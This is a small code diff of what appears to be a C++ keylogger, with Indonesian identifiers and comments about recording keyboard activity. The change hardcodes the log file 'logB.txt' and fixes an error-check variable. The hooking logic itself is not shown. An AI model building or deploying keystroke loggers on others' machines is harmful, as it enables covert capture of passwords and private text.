@@ -110,7 +110,7 @@ void olahMasukan(int in, bool tCtrl, bool tAlt, bool tShift, bool tCapslock){
 
 
 // mulai merekam masukan keyboard
-void mulaiRekam(char *namaBerkas){
+void mulaiRekam(){
 	
 	/* ------------------------------
 	* Standard C
@@ -125,9 +125,9 @@ void mulaiRekam(char *namaBerkas){
 	
 	// Standard C++
 	ofstream outfile;
-	outfile.open(namaBerkas, ios::out | ios::app);
+	outfile.open("logB.txt", ios::out | ios::app);
 	// Membuka file dengan append mode.
-	if (!out) {
+	if (!outfile) {
 		cerr << "Tidak bisa membuka file!" <<endl;
 		abort();
 	}
@@ -195,7 +195,7 @@ void mulaiRekam(char *namaBerkas){
 int main(){
 	
 	// mulai merekam aktivitas keyboard
-	mulaiRekam("logB.txt");
+	mulaiRekam();
 	
 	return 0;
 }
